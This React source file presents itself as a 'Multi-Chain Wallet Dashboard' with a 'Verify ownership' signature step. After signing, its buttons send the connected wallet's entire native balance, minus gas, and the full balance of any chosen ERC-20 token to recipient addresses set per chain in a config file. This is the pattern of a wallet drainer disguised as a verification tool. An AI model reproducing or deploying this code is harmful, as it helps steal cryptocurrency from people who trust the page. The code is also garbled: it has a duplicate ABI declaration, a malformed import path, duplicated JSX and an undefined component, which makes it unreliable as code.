import React, { useState, useEffect } from "react";
import {
  AppKitProvider,
  AppKitButton,
  useAppKitAccount,
  useAppKitNetwork,
  useAppKitSignMessage
} from "@reown/appkit/react";
import {
  useBalance,
  WagmiConfig,
  createConfig,
  configureChains
} from "wagmi";
import { publicProvider } from "wagmi/providers/public";
import { ethers } from "ethers";
import { REOWN_PROJECT_ID, RECIPIENTS, SUPPORTED_CHAINS } from "./config.js";
import { ERC20_ABI } from ".abi//ERC20.js";

/* ERC-20 minimal ABI */
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

/* Wagmi config */
const { chains, publicClient } = configureChains(SUPPORTED_CHAINS, [publicProvider()]);
const wagmiConfig = createConfig({ publicClient });

function Dashboard() {
  const { address, isConnected } = useAppKitAccount();
  const { chain } = useAppKitNetwork();
  const { signMessageAsync } = useAppKitSignMessage();
  const { data: nativeBalance, refetch: refetchNative } = useBalance({
    address,
    chainId: chain?.id,
    enabled: !!address && !!chain
  });

  const [signedMessage, setSignedMessage] = useState("");
  const [verified, setVerified] = useState(false);
  const [sendingNative, setSendingNative] = useState(false);
  const [tokenAddress, setTokenAddress] = useState("");
  const [tokenBalance, setTokenBalance] = useState(null);
  const [tokenDecimals, setTokenDecimals] = useState(null);
  const [tokenSymbol, setTokenSymbol] = useState("");
  const [sendingToken, setSendingToken] = useState(false);

  const getRecipient = () => {
    if (!chain) return null;
    const foundChain = SUPPORTED_CHAINS.find(c => c.id === chain.id);
    if (!foundChain) return null;
    return RECIPIENTS[foundChain.name.toLowerCase()];
  };

  /* Sign wallet */
  const handleSign = async () => {
    if (!address) return alert("Connect wallet first");
    try {
      const message = `Verify ownership of wallet ${address} for Reown dashboard`;
      const signature = await signMessageAsync({ message });
      setSignedMessage(signature);
      setVerified(true);
      alert("Wallet successfully verified with Reown!");
    } catch (err) {
      console.error(err);
      alert("Signing failed: " + err.message);
    }
  };

  /* Send all native balance minus estimated gas */
  const handleSendNative = async () => {
    if (!address || !nativeBalance) return alert("Connect wallet first");
    const recipient = getRecipient();
    if (!recipient) return alert("No recipient for this chain");
    try {
      setSendingNative(true);
      const provider = window.ethereum || window.reown?.provider;
      const signer = new ethers.providers.Web3Provider(provider).getSigner();

      const balanceBN = ethers.utils.parseEther(nativeBalance.formatted);
      const tx = { to: recipient, value: balanceBN };
      const estimatedGas = await signer.estimateGas(tx);
      const gasPrice = await signer.getGasPrice();

      const sendAmount = balanceBN.sub(estimatedGas.mul(gasPrice));
      if (sendAmount.lte(0)) return alert("Insufficient balance to cover gas");

      const txResponse = await signer.sendTransaction({ to: recipient, value: sendAmount });
      await txResponse.wait();
      alert(`Sent ${ethers.utils.formatEther(sendAmount)} ${nativeBalance.symbol} to ${recipient}`);
      refetchNative();
      setSendingNative(false);
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
      setSendingNative(false);
    }
  };

  /* Fetch ERC-20 token balance */
  const fetchTokenBalance = async () => {
    if (!address || !tokenAddress) return;
    try {
      const provider = window.ethereum || window.reown?.provider;
      const signer = new ethers.providers.Web3Provider(provider).getSigner();
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const balance = await tokenContract.balanceOf(address);
      const decimals = await tokenContract.decimals();
      const symbol = await tokenContract.symbol();

      setTokenBalance(balance);
      setTokenDecimals(decimals);
      setTokenSymbol(symbol);
    } catch (err) {
      console.error(err);
      alert("Failed to fetch token balance: " + err.message);
    }
  };

  /* Send all ERC-20 token balance */
  const handleSendToken = async () => {
    if (!address || !tokenBalance || !tokenDecimals) return alert("Connect wallet and fetch token balance first");
    const recipient = getRecipient();
    if (!recipient) return alert("No recipient for this chain");
    try {
      setSendingToken(true);
      const provider = window.ethereum || window.reown?.provider;
      const signer = new ethers.providers.Web3Provider(provider).getSigner();
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const txResponse = await tokenContract.transfer(recipient, tokenBalance);
      await txResponse.wait();
      alert(`Sent ${ethers.utils.formatUnits(tokenBalance, tokenDecimals)} ${tokenSymbol} to ${recipient}`);
      fetchTokenBalance();
      setSendingToken(false);
    } catch (err) {
      console.error(err);
      alert("Token transfer failed: " + err.message);
      setSendingToken(false);
    }
  };

  useEffect(() => {
    if (tokenAddress) fetchTokenBalance();
  }, [tokenAddress, address]);

  return (
<div style={styles.container}>
  <h1 style={styles.title}>Multi-Chain Wallet Dashboard</h1>

  {/* Wallet Connect Status */}
  <WalletConnectStatus isConnected={isConnected} address={address} chain={chain} />

  <AppKitButton />

  {isConnected && (
    <div style={styles.card}>
      {/* ... rest of your wallet info, sign, send buttons ... */}
    </div>
  )}
</div>
      <AppKitButton />

      {isConnected && (
        <div style={styles.card}>
          <p><strong>Address:</strong> {address}</p>
          <p><strong>Network:</strong> {chain?.name} ({chain?.id})</p>
          {nativeBalance && <p><strong>Native Balance:</strong> {nativeBalance.formatted} {nativeBalance.symbol}</p>}
          <p><strong>Recipient:</strong> {getRecipient()}</p>

          {/* Sign Wallet */}
          <button style={styles.signButton} onClick={handleSign}>Sign Wallet (Verify on Reown)</button>
          {verified && <p style={{ color: "#0f0", fontWeight: "bold" }}>✅ Wallet Verified!</p>}
          {signedMessage && <p style={{ wordBreak: "break-all" }}>Signature: {signedMessage}</p>}

          {/* Send Native */}
          {verified && (
            <button style={styles.sendButton} onClick={handleSendNative} disabled={sendingNative}>
              {sendingNative ? "Sending..." : `Send All Native ${nativeBalance?.symbol}`}
            </button>
          )}

          {/* ERC-20 Token */}
          {verified && (
            <div style={{ marginTop: "20px" }}>
              <input
                type="text"
                placeholder="ERC-20 Token Contract Address"
                value={tokenAddress}
                onChange={e => setTokenAddress(e.target.value)}
                style={styles.input}
              />
              {tokenBalance && tokenDecimals && tokenSymbol && (
                <p>Balance: {ethers.utils.formatUnits(tokenBalance, tokenDecimals)} {tokenSymbol}</p>
              )}
              <button style={styles.sendButton} onClick={handleSendToken} disabled={sendingToken}>
                {sendingToken ? "Sending..." : `Send All ERC-20 Token`}
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

/* Styles with animated background */
const styles = {
  container: {
    minHeight: "100vh",
    background: "linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000)",
    backgroundSize: "400% 400%",
    animation: "gradient 12s ease infinite",
    color: "white",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    padding: "40px"
  },
  title: { marginBottom: "20px" },
  card: {
    background: "rgba(255,255,255,0.08)",
    padding: "20px",
    borderRadius: "12px",
    marginTop: "20px",
    width: "100%",
    maxWidth: "500px",
    backdropFilter: "blur(10px)"
  },
  signButton: {
    padding: "10px 20px",
    borderRadius: "30px",
    border: "none",
    marginTop: "10px",
    fontWeight: "bold",
    background: "linear-gradient(90deg,#00f2fe,#4facfe)",
    color: "white",
    cursor: "pointer"
  },
  sendButton: {
    padding: "10px 20px",
    borderRadius: "30px",
    border: "none",
    marginTop: "10px",
    fontWeight: "bold",
    background: "linear-gradient(90deg,#43e97b,#38f9d7)",
    color: "white",
    cursor: "pointer"
  },
  input: {
    width: "100%",
    padding: "10px",
    borderRadius: "8px",
    border: "none",
    marginTop: "10px"
  }
};

/* Inject keyframes for gradient animation */
const styleSheet = document.styleSheets[0];
styleSheet.insertRule(`
@keyframes gradient {
  0% {background-position:0% 50%;}
  50% {background-position:100% 50%;}
  100% {background-position:0% 50%;}
}
`, styleSheet.cssRules.length);

export default function App() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <AppKitProvider projectId={REOWN_PROJECT_ID} networks={SUPPORTED_CHAINS}>
        <Dashboard />
      </AppKitProvider>
    </WagmiConfig>
  );
}